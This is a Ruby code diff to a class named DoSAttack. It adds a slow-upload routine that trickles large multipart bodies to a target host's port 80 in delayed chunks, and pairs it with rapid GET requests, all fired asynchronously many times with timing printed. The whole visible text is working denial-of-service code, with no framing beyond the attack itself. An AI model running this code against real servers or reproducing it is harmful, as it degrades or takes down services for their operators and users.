@@ -36,7 +36,10 @@ class DoSAttack
   end
 
   def run
-    @times.times{ async.request }
+    @times.times do
+      async.slow_upload
+      async.fast_request
+    end
   end
 
   private
@@ -44,21 +47,46 @@ class DoSAttack
     @socks.each_value(&:close)
   end
 
+  def slow_upload
+    request do |sock|
+      sock.write(@header)
+      sock.write(@payload)
+      (@size / 8192).times do
+        sock.write(PAYLOAD)
+        sleep 0.1
+      end
+      sock.write("\0" * (@size % 8192))
+      sock.write("#{NEWLINE}--b--")
+
+      " Slow Upload: "
+    end
+  end
+
+  def fast_request
+    request do |sock|
+      sock.write("GET / HTTP/1.1#{NEWLINE}HOST: #{@host}#{NEWLINE}#{NEWLINE}")
+
+      "Fast Request: "
+    end
+  end
+
   def request
-    now = Time.now
+    now  = Time.now
     sock = TCPSocket.new(@host, 80)
     @socks[sock.object_id] = sock
-    sock.write(@header)
-    sock.write(@payload)
-    (@size / 8192).times do
-      sock.write(PAYLOAD)
-      sleep 0.1
-    end
-    sock.write("\0" * (@size % 8192))
-    sock.write("#{NEWLINE}--b--")
+    msg = yield(sock)
     res = sock.readpartial(4096)
-    printf "Server: %9f  Client: %9f\n",
+    printf "#{msg}Server: %9f  Client: %9f\n",
            res[/\r\n\r\n(.*)/, 1].to_f, (Time.now - now).to_f
+  ensure
+    cleanup(sock)
+  end
+
+  def cleanup sock
+    begin
+      sock.close
+    rescue EOFError
+    end
     @socks.delete(sock.object_id)
     if @socks.empty?
       terminate
